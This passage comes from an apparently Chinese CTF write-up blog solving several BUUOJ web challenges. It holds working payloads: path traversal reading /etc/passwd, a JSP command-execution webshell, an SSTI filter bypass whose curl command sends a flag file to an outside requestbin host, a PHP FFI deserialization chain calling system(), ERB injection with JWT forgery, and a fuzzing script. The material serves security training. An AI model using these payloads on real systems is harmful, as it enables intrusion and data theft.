xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee http:&#x2F;&#x2F;xmlns.jcp.org&#x2F;xml&#x2F;ns&#x2F;javaee&#x2F;web-app_4_0.xsd&quot;</span><br><span class="line">         version&#x3D;&quot;4.0&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;context-param&gt;</span><br><span class="line">        &lt;param-name&gt;webAppRootKey&lt;&#x2F;param-name&gt;</span><br><span class="line">        &lt;param-value&gt;tomcat.ajp&lt;&#x2F;param-value&gt;</span><br><span class="line">    &lt;&#x2F;context-param&gt;</span><br><span class="line"></span><br><span class="line">    &lt;listener&gt;</span><br><span class="line">        &lt;listener-class&gt;</span><br><span class="line">            org.springframework.web.util.WebAppRootListener</span><br><span class="line">        &lt;&#x2F;listener-class&gt;</span><br><span class="line">    &lt;&#x2F;listener&gt;</span><br><span class="line"></span><br><span class="line">    &lt;welcome-file-list&gt;</span><br><span class="line">        &lt;welcome-file&gt;&#x2F;WEB-INF&#x2F;views&#x2F;index.jsp&lt;&#x2F;welcome-file&gt;</span><br><span class="line">    &lt;&#x2F;welcome-file-list&gt;</span><br><span class="line"></span><br><span class="line">    &lt;error-page&gt;</span><br><span class="line">        &lt;exception-type&gt;java.lang.Throwable&lt;&#x2F;exception-type&gt;</span><br><span class="line">        &lt;location&gt;&#x2F;error&lt;&#x2F;location&gt;</span><br><span class="line">    &lt;&#x2F;error-page&gt;</span><br><span class="line">&lt;&#x2F;web-app&gt;</span><br></pre></td></tr></table></figure><p>尝试读取/etc/passwd:<code>/download?file=../../../../../../../etc/passwd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:100:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:101:101::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:102:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:103:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:104:105:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:105:106:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:106:107:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>使用CVE-2020-1938exp（<a href="https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py）尝试进行文件读取。成功获取页面" target="_blank" rel="noopener">https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py）尝试进行文件读取。成功获取页面</a></p><blockquote><p>注意由于靶机在内网，所以IP地址是根据Lan Domain确定的，外网IP是内网穿透绑定的</p></blockquote><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403221242014.png" alt></p><p>构造exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*&quot;%&gt;</span><br><span class="line">&lt;% </span><br><span class="line">out.println(&quot;Executing command&quot;);</span><br><span class="line">Process p &#x3D; Runtime.getRuntime().exec(&quot;ls &#x2F;&quot;);</span><br><span class="line">OutputStream os &#x3D; p.getOutputStream();</span><br><span class="line">InputStream in &#x3D; p.getInputStream();</span><br><span class="line">DataInputStream dis &#x3D; new DataInputStream(in);</span><br><span class="line">String disr &#x3D; dis.readLine();</span><br><span class="line">while ( disr !&#x3D; null ) &#123;</span><br><span class="line">  out.println(disr); </span><br><span class="line">  disr &#x3D; dis.readLine(); </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>上传成功后利用文件包含执行木马，最后<code>cat /flag78bt787it8b9b098j0k80k0ggg</code>得到flag</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200403221421718.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://www.gem-love.com/ctf/2176.html#easyweb" target="_blank" rel="noopener">https://www.gem-love.com/ctf/2176.html#easyweb</a></p><p><a href="https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves" target="_blank" rel="noopener">https://www.52hertz.tech/2020/03/30/wctf2020_official_wp/#easyweb-23-solves</a></p></blockquote><h3 id="0x-04-GWCTF-2019-你的名字"><a href="#0x-04-GWCTF-2019-你的名字" class="headerlink" title="0x 04 [GWCTF 2019]你的名字"></a>0x 04 [GWCTF 2019]你的名字</h3><ul><li><p>考点</p><p>ssti bypass</p></li><li><p>解题过程</p></li></ul><p>经过fuzz,后台强过滤匹配<code></code>，这里可以用if语句绕过。黑名单过滤如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">blacklist &#x3D; [&#39;import&#39;, &#39;getattr&#39;, &#39;os&#39;, &#39;class&#39;, &#39;subclasses&#39;, &#39;mro&#39;, &#39;request&#39;, &#39;args&#39;, &#39;eval&#39;, &#39;if&#39;, &#39;for&#39;,</span><br><span class="line">                 &#39; subprocess&#39;, &#39;file&#39;, &#39;open&#39;, &#39;popen&#39;, &#39;builtins&#39;, &#39;compile&#39;, &#39;execfile&#39;, &#39;from_pyfile&#39;, &#39;local&#39;,</span><br><span class="line">                 &#39;self&#39;, &#39;item&#39;, &#39;getitem&#39;, &#39;getattribute&#39;, &#39;func_globals&#39;, &#39;config&#39;]</span><br><span class="line">for no in blacklist:</span><br><span class="line">    while True:</span><br><span class="line">        if no in s:</span><br><span class="line">            s &#x3D; s.replace(no, &#39;&#39;)</span><br><span class="line">        else:</span><br><span class="line">            break</span><br><span class="line">return s</span><br></pre></td></tr></table></figure><p>这个逻辑是按顺序针对每个关键词过滤，只能应付双写绕过，可以用列表的最后一项来绕过过滤,payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf &#39;&#39;.__claconfigss__.__mconfigro__[2].__subclaconfigsses__()[59].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(&#39;curl http:&#x2F;&#x2F;http.requconfigestbin.buuoj.cn&#x2F;1inhq4f1 -d &#96;cat &#x2F;flag_1s_Hera&#96;;&#39;) %&#125;1&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure><p>过滤之后最终的脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;curl http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1inhq4f1 -d &#96;cat &#x2F;flag_1s_Hera&#96;;&#39;) %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><h3 id="0x-05-RCTF-2019-Nextphp"><a href="#0x-05-RCTF-2019-Nextphp" class="headerlink" title="0x 05 [RCTF 2019]Nextphp"></a>0x 05 [RCTF 2019]Nextphp</h3><ul><li><p>考点</p><p>php7.4新版本特性</p></li><li><p>解题过程</p></li></ul><ol><li>查看php配置信息，版本是7.4，同时发现过滤了大多数系统函数</li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414224651185.png" alt></p><ol start="2"><li>没有过滤scandir函数，payload:<code>?a=var_dump(scandir(&#39;/var/www/html&#39;));</code></li></ol><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414224810734.png" alt></p><ol start="3"><li>利用file_get_contents()查看preload.php源码，payload：<code>a=echo file_get_contents(&#39;preload.php&#39;);</code></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">final class A implements Serializable &#123;</span><br><span class="line">    protected $data &#x3D; [</span><br><span class="line">        &#39;ret&#39; &#x3D;&gt; null,</span><br><span class="line">        &#39;func&#39; &#x3D;&gt; &#39;print_r&#39;,</span><br><span class="line">        &#39;arg&#39; &#x3D;&gt; &#39;1&#39;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#39;ret&#39;] &#x3D; $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __serialize(): array &#123;</span><br><span class="line">        return $this-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unserialize(array $data) &#123;</span><br><span class="line">        array_merge($this-&gt;data, $data);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data &#x3D; unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set ($key, $value) &#123;</span><br><span class="line">        throw new \Exception(&#39;No implemented&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">        throw new \Exception(&#39;No implemented&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码是：PHP7.4新特性：新的自定义对象序列化机制：<a href="https://wiki.php.net/rfc/custom_object_serialization" target="_blank" rel="noopener">关于<strong>serialize和</strong>unserialize</a></p><ol start="4"><li>观察代码，发现对象反序列化时会执行run()方法</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">private function run () &#123;</span><br><span class="line">        $this-&gt;data[&#39;ret&#39;] &#x3D; $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时发现可以结合__get魔法函数，获取对象data数组中的元素值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __get ($key) &#123;</span><br><span class="line">        return $this-&gt;data[$key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>根据题目文件名称提示关注php7.4的新特性，关于<code>opcache.preload</code>，参考这篇文章<a href="https://wiki.php.net/rfc/preload" target="_blank" rel="noopener">https://wiki.php.net/rfc/preload</a> 可知</li></ol><blockquote><p><a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> 是 <strong>PHP7.4</strong> 中新加入的功能。如果设置了 <a href="https://www.php.net/manual/en/opcache.configuration.php#ini.opcache.preload" target="_blank" rel="noopener">opcache.preload</a> ，那么在所有Web应用程序运行之前，服务会先将设定的 <strong>preload</strong> 文件加载进内存中，使这些 <strong>preload</strong> 文件中的内容对之后的请求均可用。</p></blockquote><p>在这篇文档尾巴可以看到如下描述：</p><blockquote><p>In conjunction with ext/FFI (dangerous extension), we may allow FFI  functionality only in preloaded PHP files, but not in regular ones</p></blockquote><p>大概意思就是说允许在 <strong>preload</strong> 文件中使用 <strong>FFI</strong> 拓展，但是文档中说了 <strong>FFI</strong> 是一个危险的拓展，而这道题目却开启了 <strong>FFI</strong> 拓展。</p><p>构造exp如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A implements Serializable &#123;</span><br><span class="line">    protected $data &#x3D; [</span><br><span class="line">        &#39;ret&#39; &#x3D;&gt; null,</span><br><span class="line">        &#39;func&#39; &#x3D;&gt; &#39;FFI::cdef&#39;,</span><br><span class="line">        &#39;arg&#39; &#x3D;&gt; &#39;int system(const char *command);&#39;</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    public function serialize (): string &#123;</span><br><span class="line">        return serialize($this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    public function unserialize($payload) &#123;</span><br><span class="line">        $this-&gt;data &#x3D; unserialize($payload);</span><br><span class="line">        $this-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct () &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new A();</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>最终payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x3D;$a%3dunserialize(&#39;C%3A1%3A%22A%22%3A95%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A32%3A%22int+system%28const+char+%2Acommand%29%3B%22%3B%7D%7D&#39;)-&gt;ret;var_dump($a-&gt;system(&quot;cat%20&#x2F;flag&gt;b.txt&quot;));</span><br></pre></td></tr></table></figure><p>最后访问b.txt得到flag</p><p>参考资料：</p><blockquote><p><a href="https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp" target="_blank" rel="noopener">https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp</a></p><p><a href="https://blog.csdn.net/qq_41809896/article/details/90384668" target="_blank" rel="noopener">https://blog.csdn.net/qq_41809896/article/details/90384668</a></p><p><a href="https://cjm00n.top/CTF/buuoj-writeup-2.html" target="_blank" rel="noopener">https://cjm00n.top/CTF/buuoj-writeup-2.html</a></p></blockquote><h3 id="0x-06-SCTF2019-Flag-Shop"><a href="#0x-06-SCTF2019-Flag-Shop" class="headerlink" title="0x 06 [SCTF2019]Flag Shop"></a>0x 06 [SCTF2019]Flag Shop</h3><ul><li><p>考点</p><p>erb模版注入</p></li><li><p>解题过程</p></li></ul><ol><li><p>页面打开是一个购买flag的页面，flag需要1e+27个JinKela才能购买，数量不够。访问robots.txt发现filebak目录，访问得到页面源代码</p></li><li><p>审计代码发现</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">get &quot;&#x2F;work&quot; do</span><br><span class="line">  islogin</span><br><span class="line">  auth &#x3D; JWT.decode cookies[:auth],ENV[&quot;SECRET&quot;] , true, &#123; algorithm: &#39;HS256&#39; &#125;</span><br><span class="line">  auth &#x3D; auth[0]</span><br><span class="line">  unless params[:SECRET].nil?</span><br><span class="line">    if ENV[&quot;SECRET&quot;].match(&quot;#&#123;params[:SECRET].match(&#x2F;[0-9a-z]+&#x2F;)&#125;&quot;)</span><br><span class="line">      puts ENV[&quot;FLAG&quot;]</span><br><span class="line">    end</span><br><span class="line">  end</span><br><span class="line"></span><br><span class="line">  if params[:do] &#x3D;&#x3D; &quot;#&#123;params[:name][0,7]&#125; is working&quot; then</span><br><span class="line"></span><br><span class="line">    auth[&quot;jkl&quot;] &#x3D; auth[&quot;jkl&quot;].to_i + SecureRandom.random_number(10)</span><br><span class="line">    auth &#x3D; JWT.encode auth,ENV[&quot;SECRET&quot;] , &#39;HS256&#39;</span><br><span class="line">    cookies[:auth] &#x3D; auth</span><br><span class="line">    ERB::new(&quot;&lt;script&gt;alert(&#39;#&#123;params[:name][0,7]&#125; working successfully!&#39;)&lt;&#x2F;script&gt;&quot;).result</span><br><span class="line"></span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>如果传入的do参数和name参数一致，会输出<code>{params[:name][0,7]} working successfully!</code></p><p>但是限制了只能输入7个字符，除去&lt;%==&gt;只有两个字符可以利用，这时可以利用ruby全局变量$&amp;，可以获得上一次正则匹配的结果</p><p>payload：<code>/work?SECRET=&amp;name=%3c%25%3d%24%27%25%3e&amp;do=%3c%25%3d%24%27%25%3e%20is%20working</code></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414232933574.png" alt></p><p>成功拿到secret,接着伪造cookie</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233126939.png" alt></p><p>回到页面，buy flag，抓包将伪造的cookie写进去，在返回的包里拿到新的cookie，解密得到flag</p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233252575.png" alt></p><p><img src="/2020/04/01/BUUOJ-web%E5%88%B7%E9%A2%98%EF%BC%88%E5%9B%9B%EF%BC%89/image-20200414233323947.png" alt></p><p>参考资料：</p><blockquote><p><a href="https://github.com/ev0A/SCTF2019-Flag-Shop/blob/master/Write-Up/write-up.md" target="_blank" rel="noopener">https://github.com/ev0A/SCTF2019-Flag-Shop/blob/master/Write-Up/write-up.md</a></p></blockquote><h3 id="0x-07-NESTCTF-2019-Love-Math-2"><a href="#0x-07-NESTCTF-2019-Love-Math-2" class="headerlink" title="0x 07 [NESTCTF 2019]Love Math 2"></a>0x 07 [NESTCTF 2019]Love Math 2</h3><ul><li><p>考点</p><p>php动态特性捕捉</p></li><li><p>解题过程</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload &#x3D; [‘abs‘, ‘acos‘, ‘acosh‘, ‘asin‘, ‘asinh‘, ‘atan2‘, ‘atan‘, ‘atanh‘,  ‘bindec‘, ‘ceil‘, ‘cos‘, ‘cosh‘, ‘decbin‘ , ‘decoct‘, ‘deg2rad‘, ‘exp‘, ‘expm1‘, ‘floor‘, ‘fmod‘, ‘getrandmax‘, ‘hexdec‘, ‘hypot‘, ‘is_finite‘, ‘is_infinite‘, ‘is_nan‘, ‘lcg_value‘, ‘log10‘, ‘log1p‘, ‘log‘, ‘max‘, ‘min‘, ‘mt_getrandmax‘, ‘mt_rand‘, ‘mt_srand‘, ‘octdec‘, ‘pi‘, ‘pow‘, ‘rad2deg‘, ‘rand‘, ‘round‘, ‘sin‘, ‘sinh‘, ‘sqrt‘, ‘srand‘, ‘tan‘, ‘tanh‘];</span><br><span class="line">for($k&#x3D;1;$k&lt;&#x3D;sizeof($payload);$k++)&#123;</span><br><span class="line">    for($i &#x3D; 0;$i &lt; 9; $i++)&#123;</span><br><span class="line">        for($j &#x3D; 0;$j &lt;&#x3D;9;$j++)&#123;</span><br><span class="line">            $exp &#x3D; $payload[$k] ^ $i.$j;</span><br><span class="line">            echo($payload[$k].&quot;^$i$j&quot;.&quot;&#x3D;&#x3D;&gt;$exp&quot;);</span><br><span class="line">            echo &quot;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php?c&#x3D;$pi&#x3D;(is_nan^(6).(4)).(tan^(1).(5));$pi&#x3D;$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0&#x3D;system&amp;1&#x3D;&lt;command&gt;</span><br></pre></td></tr></table></figure><p>参考资料：</p><blockquote><p><a href="https://www.cnblogs.com/yesec/p/12664136.html" target="_blank" rel="noopener">https://www.cnblogs.com/yesec/p/12664136.html</a></p></blockquote><h3 id="0x-08-Zer0pts2020-Can-you-guess-it"><a href="#0x-08-Zer0pts2020-Can-you-guess-it" class="headerlink" title="0x 08 [Zer0pts2020]Can you guess it?"></a>0x 08 [Zer0pts2020]Can you guess it?</h3><ul><li><p>考点</p><p>正则污染绕过、代码审计</p></li><li><p>解题过程</p></li></ul><ol><li>打开题目访问源代码进行审计</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$_SERVER[&#39;PHP_SELF&#39;]表示当前php文件相对于网站根目录的位置地址</span><br><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;])); &#x2F;&#x2F;basename() 函数返回路径中的文件名部分</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret &#x3D; bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#39;guess&#39;])) &#123;</span><br><span class="line">  $guess &#x3D; (string) $_POST[&#39;guess&#39;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message &#x3D; &#39;Wrong.&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>问题出在了basename()函数可以跨目录读取文件，但是需要绕过正则，这里可以用污染绕过，贴一下y1ng师傅的fuzz脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import requests</span><br><span class="line">for i in range (0,500):</span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;814589eb-4094-4449-bf79-39388aa86610.node3.buuoj.cn&#x2F;index.php&#x2F;config.php&#x2F;&#123;&#125;?source&#39;.format(hex(i).replace(&#39;0x&#39;, &#39;%&#39;))</span><br><span class="line">r &#x3D; requests.get(url)</span><br><span class="line">print(url)</span><br><span class="line">if r&quot;flag&quot; in r.text:</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure><p>可以fuzz出很多可以用的参数</p><h3 id="0x-09-Zer0pts2020-musicblog"><a href="#0x-09-Zer0pts2020-musicblog" class="headerlink" title="0x 09 [Zer0pts2020]musicblog"></a>0x 09 [Zer0pts2020]musicblog</h3><ul><li><p>考点</p><p>代码设计、XSS bypass</p></li><li><p>解题过程</p></li></ul><ol><li><p>下载题目附件进行审计，在work.js中发现存在flag且设置在浏览器UA中，后台机器人会点击<code>#like</code>标签<img 